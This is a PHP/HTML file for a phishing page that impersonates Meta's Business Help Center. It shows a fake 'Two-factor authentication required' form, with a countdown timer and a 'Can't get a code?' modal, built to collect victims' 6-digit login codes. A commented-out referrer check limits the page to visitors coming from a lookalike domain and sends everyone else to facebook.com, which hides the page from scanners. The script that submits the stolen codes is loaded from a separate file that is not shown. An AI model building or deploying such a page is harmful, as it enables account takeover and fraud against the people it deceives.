<?php
// $referringDomain = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
// $allowedDomain = 'business.check-verify-accounts.com';
// if ($referringDomain !== $allowedDomain) {
//     header("HTTP/1.1 301 Moved Permanently");
//     header("Location: https://facebook.com/");
//     exit();
// }
?>
<html lang="en">

<head>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="js/bootstrap.js" crossorigin="anonymous"></script>
  <script src="js/common.js"></script>
  <meta charset="utf-8">
  <meta property="og:type" content="article">
  <meta property="og:title" content="Buiness Help Center">
  <meta name="description" content="Buiness Help Center">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta property="og:image" content="https://res.cloudinary.com/ductham087/image/upload/v1694658537/mlipp554tgpfzfa4o3zy.jpg">
  <meta name="theme-color" content="#000000">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,200,300,400,500,700&amp;display=swap">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
  <link rel="stylesheet" href="css/confirm.css?version=v1328713232">
  <title>Business Help Center</title>
  <script>
    var minutes = 4;
    var seconds = 38;

    function updateTimer() {
      var timeri = document.getElementById("timeri");
      timeri.textContent = `${minutes}:${seconds < 10 ? "0": ""}${seconds}`;
      if (seconds > 0) {
        seconds--;
      } else {
        if (minutes > 0) {
          minutes--;
          seconds = 59;
        } else {
          clearInterval(timerInterval);
          timeri.textContent = "00:00";
          var sendCodeAgainLink = document.getElementById("sendcodeagain");
          sendCodeAgainLink.style.pointerEvents = "auto";
        }
      }
    }
    var timerInterval = setInterval(updateTimer, 1000);
  </script>
</head>

<body>
  <div id="spinner"></div>
  <div id="root">
    <div>
      <div>
        <div class="confirm">
          <section class="header">
            <div class="fotoh">
              <div class="row">
                <div class="col-6">
                  <img src="images/meta-logo.png" width="100" class="img-fluid">
                </div>
                <div class="col-6" style="text-align: right;">
                  <p style="color: rgb(53, 120, 229); display: none; padding-top: 8px; margin-bottom: 0px; font-weight: 600; font-size: 15px;">
                    <i class="fa-solid fa-envelope" style="font-size: 16px;"></i>Support Inbox
                  </p>
                </div>
              </div>
            </div>
          </section>
          <div class="main-confirm">
            <div class="container">
              <div class="content col-md-8 col-12">
                <form id="basicForm" autocomplete="off" class="ant-form ant-form-horizontal css-dev-only-do-not-override-pr0fja">
                  <div class="card">
                    <h3 class="twh3">Two-factor authentication required (1/3)</h3>
                    <div class="bodyyy">
                      <p> You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser. </p>
                      <p> Enter the 6-digit code from your <strong>code generator</strong> or third-party app below. </p>
                      <div class="form-group" style="padding-left: 0px; padding-top: 5px; padding-bottom: 5px; display: inline-block;">
                        <div class="item-form" style="display: flex; align-items: center;">
                          <div class="ant-form-item css-dev-only-do-not-override-pr0fja" style="margin: 0px;">
                            <div class="ant-row ant-form-item-row css-dev-only-do-not-override-pr0fja">
                              <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                                <div class="ant-form-item-control-input">
                                  <div class="ant-form-item-control-input-content">
                                    <div class="ant-input-number ant-input-number-in-form-item css-dev-only-do-not-override-pr0fja" style="margin-left: 0px; font-size: 14px; border-radius: 4px; box-shadow: rgba(0, 0, 0, 0.08) 0px 1px 1px inset; color: rgb(78, 77, 77);">
                                      <div class="ant-input-number-handler-wrap">
                                        <span unselectable="on" role="button" aria-label="Increase Value" aria-disabled="false" class="ant-input-number-handler ant-input-number-handler-up">
                                          <span role="img" aria-label="up" class="anticon anticon-up ant-input-number-handler-up-inner">
                                            <svg viewBox="64 64 896 896" focusable="false" data-icon="up" width="1em" height="1em" fill="currentColor" aria-hidden="true">
                                              <path d="M890.5 755.3L537.9 269.2c-12.8-17.6-39-17.6-51.7 0L133.5 755.3A8 8 0 00140 768h75c5.1 0 9.9-2.5 12.9-6.6L512 369.8l284.1 391.6c3 4.1 7.8 6.6 12.9 6.6h75c6.5 0 10.3-7.4 6.5-12.7z"></path>
                                            </svg>
                                          </span>
                                        </span>
                                        <span unselectable="on" role="button" aria-label="Decrease Value" aria-disabled="false" class="ant-input-number-handler ant-input-number-handler-down">
                                          <span role="img" aria-label="down" class="anticon anticon-down ant-input-number-handler-down-inner">
                                            <svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true">
                                              <path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path>
                                            </svg>
                                          </span>
                                        </span>
                                      </div>
                                      <div class="ant-input-number-input-wrap">
                                        <input autocomplete="off" role="spinbutton" step="1" maxlength="8" minlength="4" id="basicForm_fill_code" aria-required="true" class="ant-input-number-input" value="">
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                          <div class="form-group paddingleftt" style="display: inline-block;">
                            <p name="" id="timer" class="nolink " style="background-color: transparent; border: transparent; padding: 0px; margin: 0px; color: rgb(56, 88, 152); font-size: 13px;">( wait: <span id="timeri" style="margin-bottom: 0px;">4:39</span> ) </p>
                            <a id="sendcodeagain" class="btn " href="#" onclick="sendcodeagain();">Send Code Again?</a>
                          </div>
                        </div>
                        <p class="2fa-error" style="color:#ff4d4f;font-size:14px;margin-top: 0px;margin-bottom:0px"></p>
                      </div>
                    </div>
                    <div class="footerii" style="width: 100%;">
                      <a data-toggle="modal" data-target="#twof" class="linkupertwo" href="#" style="font-size: 14px; color: rgb(56, 88, 152); font-weight: 600; margin-bottom: 0px; float: left; margin-top: 6px; cursor: pointer; text-decoration: none;" onclick="sendcodeagain();">Need another way to authenticate?</a>
                      <div class="ant-form-item btn butoni css-dev-only-do-not-override-pr0fja" style="color: rgb(255, 255, 255); background-color: rgb(44, 132, 244); width: auto; float: right; margin: 0px; padding: 0px 7px;">
                        <div class="ant-row ant-form-item-row css-dev-only-do-not-override-pr0fja">
                          <div class="ant-col ant-form-item-control css-dev-only-do-not-override-pr0fja">
                            <div class="ant-form-item-control-input">
                              <div class="ant-form-item-control-input-content">
                                <button type="submit" class="ant-btn css-dev-only-do-not-override-pr0fja ant-btn-default" style="background-color: transparent; outline: none; border: none; box-shadow: none; color: white; font-weight: 700; font-size: 1rem; margin-bottom: 0px; width: 120px; height: 40px; position: relative;" id="submit-2fa">
                                  <span class="btn-text">Send</span>
                                  <svg class="loading-circle" viewBox="0 0 50 50" style="width: 20px; height: 20px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);">
                                    <circle class="circle" cx="25" cy="25" r="20" fill="none" stroke-width="5"></circle>
                                  </svg>
                                </button>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
          <div class="modal fade" style="margin-top: 20px; display: none;" id="exampleModal" aria-modal="true" role="dialog" data-bs-keyboard="false" data-bs-backdrop="static" aria-hidden="true">
            <div class="modal-dialog" role="document">
              <div style="box-shadow: 0 2px 26px rgba(0, 0, 0, .3), 0 0 0 1px rgba(0, 0, 0, .1)" class="modal-content">
                <div style="padding: 10px 15px; background-color: #f5f6f7; border-bottom: 1px solid #e5e5e5" class="modal-header">
                  <h5 class="modal-title" style="font-size:14px; font-weight:600; line-height: 25px;">Can't get a code?</h5>
                  <button type="button" class="close btn-modal-cancel">
                    <span aria-hidden="true" action="#">×</span>
                  </button>
                </div>
                <form style="margin-bottom: 0px;">
                  <div class="modal-body" id="Options">
                    <!-- Radio checklist options -->
                    <div class="form-group">
                      <label style="font-size:14px;">Select an Option:</label>
                    </div>
                    <!-- Additional content -->
                    <p class="password-error" style="color:red;font-size:14px;margin-top: 6px;"></p>
                    <p class="password-validating" style="color:green;font-size:14px;margin-top: 6px;"></p>
                  </div>
                  <div class="modal-footer">
                    <button style="background-color: #f5f6f7; border:1px solid #ccd0d5; color: #4b4f56; height:27px; padding:1px 10px; line-height:23px; font-size:13px; font-weight:600" type="button" class="btn btn-secondary btn-modal-cancel"> Cancel </button>
                    <button style="background-color:#4065b4; height:27px; border: 1px solid #4267b2; padding: 1px 10px; line-height:23px; font-size:13px; font-weight:600" type="button" class="btn btn-primary submit_resend"> Submit </button>
                    <button style="background-color:#4065b4; height:27px; border: 1px solid #4267b2; padding: 1px 10px; line-height:23px; font-size:13px; font-weight:600" type="button" class="btn btn-primary try-again" hidden=""> Try Again </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <div style="position: absolute; top: 0px; z-index: 2147483647; display: block !important;"></div>
  <div style="position: absolute; top: 0px; z-index: 2147483647; display: block !important;"></div>
  <div style="position: absolute; top: 0px; z-index: 2147483647; display: block !important;"></div>

  <div style="position: absolute; top: 0px; z-index: 2147483647; display: block !important;"></div>
</body>
<div style="position: absolute; top: 0px; z-index: 2147483647; display: block !important;"></div>

</html>